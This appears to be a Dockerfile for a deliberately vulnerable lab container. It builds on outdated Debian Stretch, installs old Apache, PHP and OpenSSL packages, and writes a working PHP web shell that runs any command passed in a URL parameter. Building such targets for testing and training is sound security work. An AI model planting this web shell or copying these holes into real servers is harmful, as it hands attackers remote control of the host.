# Use an outdated and vulnerable base image (Debian Stretch)
FROM debian:stretch

# Install outdated and known vulnerable packages
RUN apt-get update && apt-get install -y \
    openssl \
    libssl1.0.0 \
    curl \
    wget \
    apache2 \
    php \
    vim \
    sudo \
    && apt-get clean

# Add a simple PHP web shell (vulnerable to remote command execution)
RUN echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > /var/www/html/shell.php

# Expose the default Apache HTTP port
EXPOSE 80

# Start Apache server in foreground when container runs
CMD ["apachectl", "-D", "FOREGROUND"]
